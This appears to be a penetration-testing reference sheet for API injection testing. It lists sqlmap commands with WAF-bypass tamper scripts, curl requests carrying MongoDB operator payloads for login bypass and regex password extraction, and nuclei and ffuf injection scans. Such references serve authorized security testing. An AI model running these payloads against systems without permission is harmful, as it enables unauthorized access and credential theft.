<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
# API Reference — Testing API Injection Attacks

## sqlmap — SQL Injection
```bash
# GET parameter
sqlmap -u "URL/api/users?id=1" --headers="Authorization: Bearer TOKEN" --batch

# POST JSON body
sqlmap -u "URL/api/search" --method POST --data='{"query":"test"}' \
  --headers="Content-Type: application/json" --batch --level 3

# Tamper scripts for WAF bypass
sqlmap -u "URL" --tamper=charencode,space2comment --batch
```

## curl — NoSQL Injection
```bash
# MongoDB operator injection
curl -s -X POST URL/api/login -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'

# Regex extraction
curl -s -X POST URL/api/login -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":{"$regex":"^a"}}'
```

## nuclei — Injection Templates
```bash
nuclei -u URL -t http/vulnerabilities/ -tags sqli,injection -severity critical,high
nuclei -u URL -t http/vulnerabilities/ -tags ssti
```

## ffuf — Payload Fuzzing
```bash
ffuf -u URL/api/search -X POST -d '{"query":"FUZZ"}' \
  -H "Content-Type: application/json" -w sqli-payloads.txt -mc all -fc 400
```
